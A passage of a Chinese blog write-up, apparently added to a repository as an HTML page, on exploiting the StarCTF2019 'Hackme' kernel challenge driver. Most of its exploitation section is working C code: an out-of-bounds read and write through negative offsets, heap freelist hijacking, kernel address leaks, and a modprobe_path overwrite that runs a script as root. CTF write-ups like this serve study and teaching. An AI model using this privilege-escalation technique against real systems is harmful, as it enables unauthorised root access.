@@ -1,0 +1,845 @@
+<!DOCTYPE html>
+<html lang="en-us">
+    
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="theme-color" content="dark">
+    <title> StarCTF2019_Hackme | FMYY&#39;S Note</title>
+    
+    
+    
+    <link rel="stylesheet" href="/sass/main.min.96090b4177a3194fa2de0860f2c55524d6582b68a41222fe4030905ef033075a.css">
+</head>
+
+    <body class="dark">
+        <nav class="navbar">
+    <div class="container">
+        <div class="flex">
+            <div>
+                <a class="brand" href="/">
+                    
+                    <span class="emoji">
+                        😎
+                    </span>
+                    
+                    FMYY&#39;S Note
+                    </a>
+            </div>
+            <div class="flex">
+                
+                <a href="/articles/">Articles</a>
+                
+                <button id="dark-mode-button"></button>
+            </div>
+            </div>
+    </div>
+</nav>
+        <main>
+            
+
+<div class="container">
+    <article>
+        <header class="article-header">
+            <div class="thumb">
+                <div>
+                    <h1>StarCTF2019_Hackme</h1>
+                    <div class="post-meta">
+                        <div>
+                            By  on <time>January 25, 2021</time>
+                        </div>
+                        <div class="tags">
+                            
+                            <a href="/tags/kernel/">Kernel</a>
+                            
+                            <a href="/tags/pwn/">Pwn</a>
+                            
+                            <a href="/tags/ctf/">CTF</a>
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </header>
+    </article>
+
+    <div class="article-post">
+    <p>此次选择StarCTF2019的Hackme题目来分析</p>
+<h3 id="题目分析">题目分析</h3>
+<h4 id="qemu启动脚本">Qemu启动脚本</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#! /bin/sh
+</span><span class="cp"></span>qemu-system-x86_64 <span class="se">\
+</span><span class="se"></span>    -m 256M <span class="se">\
+</span><span class="se"></span>    -nographic -net user -net nic <span class="se">\
+</span><span class="se"></span>    -kernel bzImage <span class="se">\
+</span><span class="se"></span>    -append <span class="s1">&#39;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#39;</span> <span class="se">\
+</span><span class="se"></span>    -monitor /dev/null 2&gt;/dev/null <span class="se">\
+</span><span class="se"></span>    -initrd initramfs.cpio <span class="se">\
+</span><span class="se"></span>    -smp <span class="nv">cores</span><span class="o">=</span>2,threads<span class="o">=</span><span class="m">2</span> <span class="se">\
+</span><span class="se"></span>    -cpu qemu64,smep,smap  <span class="se">\
+</span><span class="se"></span>    -s
+</code></pre></td></tr></table>
+</div>
+</div><p>开启以下保护</p>
+<pre><code>SMEP:  管理模式执行保护,保护内核是其不允许执行用户空间代码
+SMAP:  管理模式访问保护,禁止内核访问用户空间的数据
+KASLR: 内核地址随机化
+       同时,镜像以多线程形式启动
+</code></pre>
+<h4 id="etcinitdrcs">/etc/init.d/rcS</h4>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-sh" data-lang="sh"><span class="cp">#!/bin/sh
+</span><span class="cp"></span>
+<span class="nb">echo</span> <span class="s2">&#34;CiAgICAgICAgIyAgICMgICAgIyMjIyAgICAjIyMjIyAgIyMjIyMjCiAgICAgICAgICMgIyAgICAj
+</span><span class="s2">ICAgICMgICAgICMgICAgIwogICAgICAgIyMjICMjIyAgIyAgICAgICAgICAjICAgICMjIyMjCiAg
+</span><span class="s2">ICAgICAgICMgIyAgICAjICAgICAgICAgICMgICAgIwogICAgICAgICMgICAjICAgIyAgICAjICAg
+</span><span class="s2">ICAjICAgICMKICAgICAgICAgICAgICAgICAjIyMjICAgICAgIyAgICAjCgo=&#34;</span> <span class="p">|</span> base64 -d
+
+mount -t proc none /proc
+mount -t devtmpfs none /dev
+mkdir /dev/pts
+mount /dev/pts
+
+insmod /home/pwn/hackme.ko
+chmod <span class="m">644</span> /dev/hackme
+
+<span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/dmesg_restrict <span class="c1"># 写0,可通过 dmseg 命令查看内核日志</span>
+<span class="nb">echo</span> <span class="m">0</span> &gt; /proc/sys/kernel/kptr_restrict  <span class="c1"># 可读取/proc/kallsyms,为何此处我 cat /proc/kallsyms 指针地址都是0</span>
+cat /proc/modules
+cat /proc/kallsyms <span class="p">|</span> grep prepare_cred
+<span class="nb">cd</span> /home/pwn
+chown -R root /flag
+chmod <span class="m">400</span> /flag
+
+<span class="c1">#cat /proc/slabinfo | grep cred_jar</span>
+chown -R 1000:1000 .
+setsid cttyhack setuidgid <span class="m">1000</span> sh
+
+umount /proc
+poweroff -f
+</code></pre></td></tr></table>
+</div>
+</div><p>脚本打印了驱动模块hackme.ko加载地址,可以方便使用GDB进行调试</p>
+<h4 id="驱动模块">驱动模块</h4>
+<p>驱动写了一个常规Pwn中的堆题功能相似的结构,增删查改功能都有</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="c1">// case 0x30000: add
+</span><span class="c1">// case 0x30001: delete
+</span><span class="c1">// case 0x30002: write_to_kernel
+</span><span class="c1">// case 0x30003: read_from_kernel
+</span><span class="c1"></span><span class="k">struct</span> <span class="n">user_arg</span> <span class="p">{</span>
+	<span class="n">size_t</span> <span class="n">index</span><span class="p">;</span>
+	<span class="kt">char</span> <span class="o">*</span><span class="n">user_ptr</span><span class="p">;</span>
+	<span class="n">size_t</span> <span class="n">size</span><span class="p">;</span>
+	<span class="n">size_t</span> <span class="n">off</span><span class="p">;</span>
+<span class="p">};</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>其中存在如上一个结构体,利用ioctl与驱动交互,会读取上述0x20大小的数据到内核中</p>
+<pre><code>copy_from_user(&amp;INDEX, arg, 0x20LL);
+</code></pre>
+<h5 id="0x30000-add">0x30000 add</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span><span class="n">CMD</span> <span class="o">==</span> <span class="mh">0x3000</span><span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">Size</span> <span class="o">=</span> <span class="n">size</span><span class="p">;</span>
+	<span class="n">User_ptr</span> <span class="o">=</span> <span class="n">user_ptr</span><span class="p">;</span>
+	<span class="n">BSS_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LIST</span><span class="p">[</span><span class="mi">2</span> <span class="o">*</span> <span class="n">INDEX</span><span class="p">];</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="o">*</span><span class="n">BSS_ptr</span> <span class="p">)</span>
+		<span class="k">return</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
+	<span class="n">k_ptr</span> <span class="o">=</span> <span class="n">_kmalloc</span><span class="p">(</span><span class="n">size</span><span class="p">,</span> <span class="mh">0x6000C0LL</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="n">k_ptr</span> <span class="p">)</span>
+		<span class="k">return</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
+	<span class="o">*</span><span class="n">BSS_ptr</span> <span class="o">=</span> <span class="n">k_ptr</span><span class="p">;</span>
+	<span class="n">copy_from_user</span><span class="p">(</span><span class="n">k_ptr</span><span class="p">,</span> <span class="n">User_ptr</span><span class="p">,</span> <span class="n">Size</span><span class="p">);</span>
+	<span class="n">BSS_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="n">Size</span><span class="p">;</span>
+	<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="0x30001-delete">0x30001 delete</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span> <span class="n">CMD</span> <span class="o">==</span> <span class="mh">0x30001</span> <span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">idx</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">INDEX</span><span class="p">;</span>
+	<span class="n">k_ptr</span> <span class="o">=</span> <span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+	<span class="n">BSS_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="n">k_ptr</span> <span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">kfree</span><span class="p">(</span><span class="n">k_ptr</span><span class="p">,</span> <span class="n">Arg</span><span class="p">);</span>
+		<span class="o">*</span><span class="n">BSS_ptr</span> <span class="o">=</span> <span class="mi">0LL</span><span class="p">;</span>
+		<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">return</span> <span class="o">-</span><span class="mi">1LL</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="0x30002-write_to_kernel">0x30002 write_to_kernel</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span> <span class="n">CMD</span> <span class="o">==</span> <span class="mh">0x30002</span> <span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">idx</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">INDEX</span><span class="p">;</span>
+	<span class="n">k_ptr</span> <span class="o">=</span> <span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+	<span class="n">BSS_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="n">k_ptr</span> <span class="o">&amp;&amp;</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="n">BSS_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span>
+	<span class="p">{</span>
+		<span class="n">copy_from_user</span><span class="p">(</span><span class="n">offset</span> <span class="o">+</span> <span class="n">k_ptr</span><span class="p">,</span> <span class="n">user_ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+		<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h5 id="0x30003-read_from_kernel">0x30003 read_from_kernel</h5>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C"><span class="k">if</span> <span class="p">(</span> <span class="n">CMD</span> <span class="o">==</span> <span class="mh">0x30003</span> <span class="p">)</span>
+<span class="p">{</span>
+	<span class="n">idx</span> <span class="o">=</span> <span class="mi">2LL</span> <span class="o">*</span> <span class="n">INDEX</span><span class="p">;</span>
+	<span class="n">k_ptr</span> <span class="o">=</span> <span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+	<span class="n">BSS_ptr</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">LIST</span><span class="p">[</span><span class="n">idx</span><span class="p">];</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="n">k_ptr</span> <span class="p">)</span>
+	<span class="p">{</span>
+		<span class="k">if</span> <span class="p">(</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">size</span> <span class="o">&lt;=</span> <span class="n">BSS_ptr</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">)</span>
+		<span class="p">{</span>
+			<span class="n">copy_to_user</span><span class="p">(</span><span class="n">user_ptr</span><span class="p">,</span> <span class="n">offset</span> <span class="o">+</span> <span class="n">k_ptr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+			<span class="k">return</span> <span class="mi">0LL</span><span class="p">;</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h4 id="漏洞点">漏洞点</h4>
+<ol>
+<li>在<code>read_from_kernel</code>和<code>write_to_kernel</code>中,只检验了 <code>offset + size &lt;= BSS_ptr[1]</code>,没有检验<code>offset</code>的范围,所以<code>offset</code>可以为负数从而可以向上写数据</li>
+<li>在<code>add</code>和<code>delete</code>中,对于内核堆指针的存放和置0过程中,没有<code>加锁</code>,所以存在<code>条件竞争漏洞</code>,两个线程,一个释放堆块,一个修改或读取堆块,即可实现<code>UAF</code>漏洞</li>
+</ol>
+<h3 id="利用">利用</h3>
+<h4 id="1-负溢实现任意写">1. 负溢实现任意写</h4>
+<p>首先申请<code>5</code>次堆块,然后释放<code>1,3</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">3</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+	<span class="n">delete</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">3</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>此时<code>chunk3</code>指向<code>chunk1</code>,再利用负溢和<code>read_from_kernel</code>函数,即可从<code>index=4</code>获取位于<code>chunk3</code>中的堆地址,此处堆地址后续无用</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
+	<span class="n">heap_address</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)</span><span class="n">buf</span><span class="p">;</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;HEAP:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">heap_address</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>之后则猜测在<code>chunk0</code>之前存在系统申请的堆块,那么其中也许残留有内核指针,同样的操作,读取<code>chunk0</code>前的数据,从而计算出内核基址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">
+	<span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x200</span><span class="p">,</span><span class="o">-</span><span class="mh">0x200</span><span class="p">);</span>
+	<span class="n">kernel_base</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">((</span><span class="n">kernel_base</span> <span class="o">&amp;</span> <span class="mh">0xFFF</span><span class="p">)</span> <span class="o">!=</span> <span class="mh">0xAE0</span><span class="p">)</span>	<span class="n">exit</span><span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">);</span>
+	<span class="n">kernel_base</span> <span class="o">-=</span> <span class="mh">0x849AE0</span><span class="p">;</span> <span class="c1">// sub sysctl_table_root offset
+</span><span class="c1"></span>	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Kernel:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">kernel_base</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>既然拿到了内核地址,那么配合<code>write_to_kernel</code>修改已经释放的堆块的首位<code>8</code>个字节,则可以控制堆块任意申请到指定位置,此处还需要泄漏模块<code>hackme.ko</code>加载地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">size_t</span> <span class="n">p</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x811000</span> <span class="o">+</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// add 0x40 to avoid the junk data to cover the hackme load address
+</span><span class="c1"></span>	<span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">p</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
+	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
+	
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">5</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span> <span class="c1">// old chunk 3
+</span><span class="c1"></span>	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	
+	<span class="n">read_from_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x40</span><span class="p">,</span><span class="o">-</span><span class="mh">0x40</span><span class="p">);</span>
+	<span class="n">mod_address</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mh">0x18</span><span class="p">);</span>
+	<span class="n">printf</span><span class="p">(</span><span class="s">&#34;Mod:</span><span class="se">\t</span><span class="s">%p</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">,</span><span class="n">mod_address</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>通过<code>mod_tree</code>的偏移加上<code>kernel_base</code>计算出当前<code>mod_tree</code>在内存中的位置,加<code>0x40</code>是因为在<code>add</code>的时候,申请多大的数据则会复制多少数据到内核中,而<code>mod_tree+0x18</code>存放了<code>hackme.ko</code>的加载地址,如果在此之前因为拷贝数据会导致想要的数据被覆盖,所以申请<code>chunk</code>到想要的数据所在内存之后,然后利用负溢读取之前的数据获取<code>hackme.ko</code>的加载地址</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">delete</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">5</span><span class="p">);</span>
+	
+	<span class="n">size_t</span> <span class="n">pool</span> <span class="o">=</span> <span class="n">mod_address</span> <span class="o">+</span> <span class="mh">0x2400</span> <span class="o">+</span> <span class="mh">0x100</span><span class="p">;</span> <span class="c1">// select a suitable address to save the evil address
+</span><span class="c1"></span>	                                            <span class="c1">// here I choose pool+0x100 to save them;
+</span><span class="c1"></span>	<span class="n">memcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="o">&amp;</span><span class="n">pool</span><span class="p">,</span><span class="mi">8</span><span class="p">);</span>
+	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">4</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="o">-</span><span class="mh">0x100</span><span class="p">);</span>
+	
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">7</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	<span class="n">add</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x100</span><span class="p">);</span>
+	
+	<span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">8</span><span class="p">)</span> <span class="o">=</span> <span class="mh">0x100</span><span class="p">;</span>
+	<span class="o">*</span><span class="p">(</span><span class="n">size_t</span><span class="o">*</span><span class="p">)(</span><span class="n">buf</span> <span class="o">+</span> <span class="mi">0</span><span class="p">)</span> <span class="o">=</span> <span class="n">kernel_base</span> <span class="o">+</span> <span class="mh">0x83F960</span><span class="p">;</span> <span class="c1">// it is the offset of modprobe_path in vmlinux
+</span><span class="c1"></span>	
+	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>既然获取了驱动模块加载地址,那么此时则利用<code>堆块任意申请</code>将堆块申请到<code>pool数组</code>处,之后则可以进行控制堆块指针,实现任意写,此处我们修改<code>modprobe_path</code>指针中存放的文件地址为我们的<code>shell</code>脚本,因为执行<code>call_usermodehelper</code>时以<code>root</code>权限执行,所以当执行一个错误的<code>elf</code>文件则会触发此函数,并执行<code>modprobe_path</code>指向的文件</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-C" data-lang="C">	<span class="n">strncpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span><span class="s">&#34;/home/pwn/copy.sh</span><span class="se">\0</span><span class="s">&#34;</span><span class="p">,</span><span class="mi">18</span><span class="p">);</span>
+	
+	<span class="n">write_to_kernel</span><span class="p">(</span><span class="n">fd</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">buf</span><span class="p">,</span><span class="mi">18</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+	<span class="cm">/*
+</span><span class="cm">		#!/bin/sh
+</span><span class="cm">		/bin/cp /flag /home/pwn/flag
+</span><span class="cm">		/bin/chmod 777 /home/pwn/flag
+</span><span class="cm">	*/</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;#!/bin/sh</span><span class="se">\n</span><span class="s">/bin/cp /flag /home/pwn/flag</span><span class="se">\n</span><span class="s">/bin/chmod 777 /home/pwn/flag&#39; &gt; /home/pwn/copy.sh&#34;</span><span class="p">);</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /home/pwn/copy.sh&#34;</span><span class="p">);</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">&#34;echo -ne &#39;</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff</span><span class="se">\\</span><span class="s">xff&#39; &gt; /home/pwn/dummy&#34;</span><span class="p">);</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">&#34;chmod +x /home/pwn/dummy&#34;</span><span class="p">);</span>
+
+	<span class="n">system</span><span class="p">(</span><span class="s">&#34;/home/pwn/dummy&#34;</span><span class="p">);</span>
+	<span class="n">system</span><span class="p">(</span><span class="s">&#34;cat flag&#34;</span><span class="p">);</span>
+	<span class="n">close</span><span class="p">(</span><span class="n">fd</span><span class="p">);</span>
